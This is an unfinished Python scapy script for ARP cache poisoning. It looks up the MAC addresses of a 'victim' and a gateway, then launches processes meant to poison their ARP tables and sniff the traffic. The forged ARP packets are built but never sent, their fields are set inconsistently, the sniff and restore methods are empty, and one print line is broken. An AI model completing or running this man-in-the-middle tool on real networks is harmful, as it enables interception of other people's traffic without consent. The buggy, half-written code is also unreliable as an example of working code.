from multiprocessing import Process
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap
import os 
import sys
import time

def get_mac_address(target_ip): # Get MAC address of a target IP
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=target_ip) 
    resp, _ = srp(packet, timeout=2, retry=10, verbose=0) # Send and receive ARP request
    for _, r in resp: # Return the MAC address of the target IP
        return r[Ether].src # Return the MAC address
    return None # If no response received, return None

class Arper:
    def __init__(self, victim, gateway, interface='wlan0'):
        self.victim = victim
        self.victim_mac = get_mac_address(victim)
        self.gateway = gateway
        self.gateway_mac = get_mac_address(gateway)
        self.interface = interface
        conf.iface = self.interface
        conf.verb = 0
        print(f"Initialized {interface}")
        print(f"Gateway MAC: {self.gateway_mac}")
        print(f"victim ({victim}) is at {self.victim_mac}")
        print("_") * 30
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()


    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.victim
        poison_victim.pdst = self.gateway
        poison_victim.hwsrc = self.gateway_mac
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.victim_mac
        

        

    def sniff(self, count=200):
        pass

    def restore(self):
        pass

if __name__ == "__main__":
    (victim, gateway, interface) = sys.argv[1], sys.argv[2], sys.argv[3]
    arp_poisoner = Arper(victim, gateway, interface)
    arp_poisoner.run()
